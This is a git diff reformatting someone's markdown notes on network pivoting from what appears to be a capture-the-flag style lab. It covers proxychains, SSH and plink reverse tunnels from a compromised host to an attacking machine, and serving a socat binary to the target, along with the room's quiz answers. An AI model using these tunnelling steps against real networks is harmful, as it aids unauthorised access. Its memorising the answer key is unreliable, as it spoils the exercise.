@@ -129,139 +129,140 @@ A:  for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
 Q1: What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
 A: socks4 127.0.0.1 4242
 ```
+```
 Q2: What command would you use to telnet through a proxy to 172.16.0.100:23?
 A: proxychains telnet 172.16.0.100 23
-
+```
+```
 Q3: You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
 A: fp
+```
 
- SSH Tunnelling / Port Forwarding:
- ---------------------------------
-
+### SSH Tunnelling / Port Forwarding:
+```
 Q1: If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
 A: L
-
+```
+```
 Q2: Which switch combination can be used to background an SSH port forward or tunnel?
 A:-fN
-
+```
+```
 Q3: It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
 A: Nay
-
+```
+```
 Q4: What command would you use to create a pair of throwaway SSH keys for a reverse connection?
 A: ssh-keygen
-
+```
+```
 Q5: If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
 A: ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa
-
+```
+```
 Q6: What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
 A: ssh -D 8000 user@target.thm -fN
-
+```
+```
 Q7: If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
 A: ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
-
-
-## Commands that is use for ssh tunuling
+```
+**Commands that is use for ssh tunuling**
    
-   Method: Port forwording:
-   ------------------------
+   #### Method: Port forwording:
+   
 
-   Command syntax:     ssh -L {attacking machine local port}:{victum machine webserver ip}:{victum machine webserver port} {compromise user account name}@{compromise user account ip} -fN
+   Command syntax: `ssh -L {attacking machine local port}:{victum machine webserver ip}:{victum machine webserver port} {compromise user account name}@{compromise user account ip} -fN`
 
-   Command Example:    ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+   Command Example: `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
 
    -L : create a link to local port.
    -f : backgrounds the shell immediately so that we have our own terminal back.
    -N : tells SSH that it doesn't need to execute any commands -- only set up the connection.
 
-   Method: Creating a Proxy
-   ------------------------
+   #### Method: Creating a Proxy
 
+   Command syntax: `ssh -D {attacking machine local port which is use for proxy} {victum machine user acccount name}@{victum machine ip} -fN`
 
-   Command syntax: ssh -D {attacking machine local port which is use for proxy} {victum machine user acccount name}@{victum machine ip} -fN
-
-   command Example : ssh -D 8000 user@target.thm -fN
+   command Example : `ssh -D 8000 user@target.thm -fN`
 
    -D : Proxies are made using this flag.This will open up port on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains.
    -f : backgrounds the shell immediately so that we have our own terminal back.
    -N : tells SSH that it doesn't need to execute any commands -- only set up the connection.
 
 
-   Command Example: ssh -D 1337 user@172.16.0.5 -fN
+   Command Example: `ssh -D 1337 user@172.16.0.5 -fN`
 
- ## Commands that is use for ssh Reverse connection
-----------------------------------------------------
+**Commands that is use for ssh Reverse connection**
+
 
  ==> To make a reverse connection use the following steps
 
  1) First, generate a new set of SSH keys and store them somewhere safe using the following command.
 
- command: ssh-keygen
-
- ## Note: this step follow on attacking machine.
+ command: `ssh-keygen`
+***Note: this step follow on attacking machine.***
  This will create two new files: a private key, and a public key.
 
  2) Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
 
  3) On a new line, type the following line, then paste in the public key:
 
-command= "echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+command= `"echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`
 
 This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
 
  4) Next. check if the SSH server on your attacking machine is running with the following command
 
- command: sudo systemctl status ssh
-
- ## If the status command indicates that the server is not running then you can start the ssh service with the following command:
- sudo systemctl start ssh
+ command: `sudo systemctl status ssh`
+ If the status command indicates that the server is not running then you can start the ssh service with the following command:
+ `sudo systemctl start ssh`
 
  5) The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.
 
  With the key transferred, we can then connect back with a reverse port forward using the following command:
 
- command syntax : ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+ command syntax : `ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`
 
- command Example : ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa
+ command Example : `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa`
+ 
+ This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!
 
- ## This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!
-
-
- ## Note: In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
- command : ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+Note: In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
+ command : `ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`
 
  This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.
 
- plink.exe:
- ----------
+ ### plink.exe:
+ 
 
  
  command for sending binary and use it to gain reverse connection
 
- command: cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+ command: `cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`
+cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise)
 
- ## cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise)
+ #### Example:
 
- Example:
----------
   To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this
- command: cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
+ command: `cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`
 
- ## Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using 
- command: sudo apt install putty-tools.
+ **Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool**, which can be installed on Kali using 
+ command: `sudo apt install putty-tools`.
  After downloading the tool, conversion can be done with:
- command: puttygen KEYFILE -o OUTPUT_KEY.ppk
+ command: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
  
  Substituting in a valid file for the keyfile, and adding in the output file.
 
  The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).
-
+``
  Q:  What tool can be used to convert OpenSSH keys into PuTTY style keys?
  A: puttygen
+``
 
-
-  Socat:
-  ------
- ## to share the binary of socat in the compromise machine go to the folder/location of the
+  ### Socat:
+  
+ To share the binary of socat in the compromise machine go to the folder/location of the
  binary of the socat and open terminal there and use the following command 
 
  command: sudo python3 -m http.server 80 
